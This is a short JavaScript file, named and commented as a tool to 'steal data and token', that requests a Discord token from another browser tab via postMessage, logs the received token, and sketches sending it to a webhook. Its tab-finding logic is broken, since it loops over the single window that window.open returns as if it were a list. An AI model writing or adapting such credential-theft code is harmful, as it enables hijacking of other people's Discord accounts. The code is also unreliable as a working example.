// Define the function to steal data and token
function stealDataAndToken() {
    // Function to send a message to the other tab
    function sendMessageToOtherTab(message) {
        // Find the other tab
        var otherTab = null;

        // Loop through all open windows (tabs)
        var windows = window.open('', '_blank');
        for (var i = 0; i < windows.length; i++) {
            var win = windows[i];
            if (win !== window) {
                otherTab = win;
                break;
            }
        }

        // Send message to the other tab using postMessage
        if (otherTab) {
            otherTab.postMessage({ type: 'getDiscordToken' }, '*');
        } else {
            console.error('Unable to find the other tab.');
        }
    }

    // Listen for messages from the other tab
    window.addEventListener('message', function(event) {
        // Verify that the message is from a trusted origin
        if (event.origin !== window.origin) {
            console.error('Received message from untrusted origin:', event.origin);
            return;
        }

        // Check if the message is a response with the Discord token
        if (event.data.type === 'sendDiscordToken') {
            // Retrieve the Discord token from the message data
            var discordToken = event.data.token;

            // Proceed with stealing data using the retrieved token
            console.log('Received Discord Token:', discordToken);

            // Example: send the token to a webhook or perform other actions
            // sendMessageToDiscord(discordToken);
        }
    });

    // Call the function to send a message to the other tab requesting the Discord token
    sendMessageToOtherTab('Please send Discord token');
}

// Call the function to steal data and token
stealDataAndToken();
